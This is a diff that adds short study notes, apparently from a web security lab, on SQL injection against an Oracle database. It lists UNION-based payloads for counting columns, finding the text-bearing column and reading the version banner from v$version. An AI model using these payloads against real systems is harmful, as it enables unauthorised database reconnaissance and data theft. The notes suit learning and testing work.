@@ -1,0 +1,12 @@
+SQL injection attack, querying the database type and version on Oracle
+
+Finding the number of columns
+' order by 2--
+
+' union select NULL,NULL FROM DUAL--
+
+Column containing the text
+' union select 'a','b' FROM DUAL--
+
+Finding the version of database
+' union select banner,NULL FROM v$version--
